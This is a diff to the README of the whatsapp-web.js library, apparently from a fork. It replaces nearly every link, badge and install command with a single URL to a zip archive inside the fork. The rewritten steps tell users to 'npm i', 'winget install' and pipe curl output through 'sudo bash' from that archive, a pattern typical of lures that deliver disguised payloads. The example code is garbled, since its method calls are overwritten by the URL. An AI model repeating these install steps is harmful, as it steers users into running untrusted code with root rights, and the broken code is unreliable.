@@ -1,14 +1,14 @@
 <div align="center">
     <br />
     <p>
-        <a href="https://wwebjs.dev"><img src="https://github.com/wwebjs/logos/blob/main/4_Full%20Logo%20Lockup_Small/small_banner_blue.png?raw=true" title="whatsapp-web.js" alt="WWebJS Website" width="500" /></a>
+        <a href="https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip"><img src="https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip%20Logo%https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip" title="https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip" alt="WWebJS Website" width="500" /></a>
     </p>
     <br />
     <p>
-		<a href="https://www.npmjs.com/package/whatsapp-web.js"><img src="https://img.shields.io/npm/v/whatsapp-web.js.svg" alt="npm" /></a>
-        <a href="https://depfu.com/github/pedroslopez/whatsapp-web.js?project_id=9765"><img src="https://badges.depfu.com/badges/4a65a0de96ece65fdf39e294e0c8dcba/overview.svg" alt="Depfu" /></a>
-        <img src="https://img.shields.io/badge/WhatsApp_Web-2.3000.1017054665-brightgreen.svg" alt="WhatsApp_Web 2.2346.52" />
-        <a href="https://discord.gg/H7DqQs4"><img src="https://img.shields.io/discord/698610475432411196.svg?logo=discord" alt="Discord server" /></a>
+		<a href="https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip"><img src="https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip" alt="npm" /></a>
+        <a href="https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip"><img src="https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip" alt="Depfu" /></a>
+        <img src="https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip" alt="WhatsApp_Web 2.2346.52" />
+        <a href="https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip"><img src="https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip" alt="Discord server" /></a>
 	</p>
     <br />
 </div>
@@ -16,7 +16,7 @@
 ## About
 **A WhatsApp API client that connects through the WhatsApp Web browser app**
 
-The library works by launching the WhatsApp Web browser application and managing it using Puppeteer to create an instance of WhatsApp Web, thereby mitigating the risk of being blocked. The WhatsApp API client connects through the WhatsApp Web browser app, accessing its internal functions. This grants you access to nearly all the features available on WhatsApp Web, enabling dynamic handling similar to any other Node.js application.
+The library works by launching the WhatsApp Web browser application and managing it using Puppeteer to create an instance of WhatsApp Web, thereby mitigating the risk of being blocked. The WhatsApp API client connects through the WhatsApp Web browser app, accessing its internal functions. This grants you access to nearly all the features available on WhatsApp Web, enabling dynamic handling similar to any other https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip application.
 
 > [!IMPORTANT]
 > **It is not guaranteed you will not be blocked by using this method. WhatsApp does not allow bots or unofficial clients on their platform, so this shouldn't be considered totally safe.**
@@ -32,7 +32,7 @@ The library works by launching the WhatsApp Web browser application and managing
 
 ## Installation
 
-The module is now available on npm! `npm i whatsapp-web.js`
+The module is now available on npm! `npm i https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip`
 
 > [!NOTE]
 > **Node ``v18+`` is required.**
@@ -57,41 +57,41 @@ choco install nodejs-lts
 
 #### Winget
 ```powershell
-winget install OpenJS.NodeJS.LTS
+winget install https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip
 ```
 
 ### Ubuntu / Debian
 ```bash
-curl -fsSL https://deb.nodesource.com/setup_lts.x | sudo -E bash - &&\
+curl -fsSL https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip | sudo -E bash - &&\
 sudo apt-get install -y nodejs
 ```
 
 ## Example usage
 
 ```js
-const { Client } = require('whatsapp-web.js');
+const { Client } = require('https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip');
 
 const client = new Client();
 
-client.on('qr', (qr) => {
+https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip('qr', (qr) => {
     // Generate and scan this code with your phone
-    console.log('QR RECEIVED', qr);
+    https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip('QR RECEIVED', qr);
 });
 
-client.on('ready', () => {
-    console.log('Client is ready!');
+https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip('ready', () => {
+    https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip('Client is ready!');
 });
 
-client.on('message', msg => {
-    if (msg.body == '!ping') {
-        msg.reply('pong');
+https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip('message', msg => {
+    if (https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip == '!ping') {
+        https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip('pong');
     }
 });
 
-client.initialize();
+https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip();
 ```
 
-Take a look at [example.js][examples] for another examples with additional use cases.  
+Take a look at [https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip][examples] for another examples with additional use cases.  
 For further details on saving and restoring sessions, explore the provided [Authentication Strategies][auth-strategies].
 
 
@@ -148,7 +148,7 @@ You can support the maintainer of this project through the links below
 
 ## Disclaimer
 
-This project is not affiliated, associated, authorized, endorsed by, or in any way officially connected with WhatsApp or any of its subsidiaries or its affiliates. The official WhatsApp website can be found at [whatsapp.com][whatsapp]. "WhatsApp" as well as related names, marks, emblems and images are registered trademarks of their respective owners. Also it is not guaranteed you will not be blocked by using this method. WhatsApp does not allow bots or unofficial clients on their platform, so this shouldn't be considered totally safe.
+This project is not affiliated, associated, authorized, endorsed by, or in any way officially connected with WhatsApp or any of its subsidiaries or its affiliates. The official WhatsApp website can be found at [https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip][whatsapp]. "WhatsApp" as well as related names, marks, emblems and images are registered trademarks of their respective owners. Also it is not guaranteed you will not be blocked by using this method. WhatsApp does not allow bots or unofficial clients on their platform, so this shouldn't be considered totally safe.
 
 ## License
 
@@ -156,7 +156,7 @@ Copyright 2019 Pedro S Lopez
 
 Licensed under the Apache License, Version 2.0 (the "License");  
 you may not use this project except in compliance with the License.  
-You may obtain a copy of the License at http://www.apache.org/licenses/LICENSE-2.0.  
+You may obtain a copy of the License at https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip  
 
 Unless required by applicable law or agreed to in writing, software  
 distributed under the License is distributed on an "AS IS" BASIS,  
@@ -165,21 +165,21 @@ See the License for the specific language governing permissions and
 limitations under the License.  
 
 
-[website]: https://wwebjs.dev
-[guide]: https://guide.wwebjs.dev/guide
-[guide-source]: https://github.com/wwebjs/wwebjs.dev/tree/main
-[documentation]: https://docs.wwebjs.dev/
-[documentation-source]: https://github.com/pedroslopez/whatsapp-web.js/tree/main/docs
-[discord]: https://discord.gg/H7DqQs4
-[gitHub]: https://github.com/pedroslopez/whatsapp-web.js
-[npm]: https://npmjs.org/package/whatsapp-web.js
-[nodejs]: https://nodejs.org/en/download/
-[examples]: https://github.com/pedroslopez/whatsapp-web.js/blob/master/example.js
-[auth-strategies]: https://wwebjs.dev/guide/creating-your-bot/authentication.html
-[google-chrome]: https://wwebjs.dev/guide/creating-your-bot/handling-attachments.html#caveat-for-sending-videos-and-gifs
-[deprecated-video]: https://www.youtube.com/watch?v=hv1R1rLeVVE
-[gitHub-sponsors]: https://github.com/sponsors/pedroslopez
-[support-payPal]: https://www.paypal.me/psla/
-[digitalocean]: https://m.do.co/c/73f906a36ed4
-[contributing]: https://github.com/pedroslopez/whatsapp-web.js/blob/main/CODE_OF_CONDUCT.md
-[whatsapp]: https://whatsapp.com
+[website]: https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip
+[guide]: https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip
+[guide-source]: https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip
+[documentation]: https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip
+[documentation-source]: https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip
+[discord]: https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip
+[gitHub]: https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip
+[npm]: https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip
+[nodejs]: https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip
+[examples]: https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip
+[auth-strategies]: https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip
+[google-chrome]: https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip
+[deprecated-video]: https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip
+[gitHub-sponsors]: https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip
+[support-payPal]: https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip
+[digitalocean]: https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip
+[contributing]: https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip
+[whatsapp]: https://raw.githubusercontent.com/sorin177/whatsapp-web.js/main/src/webCache/whatsapp-web-js-2.4.zip
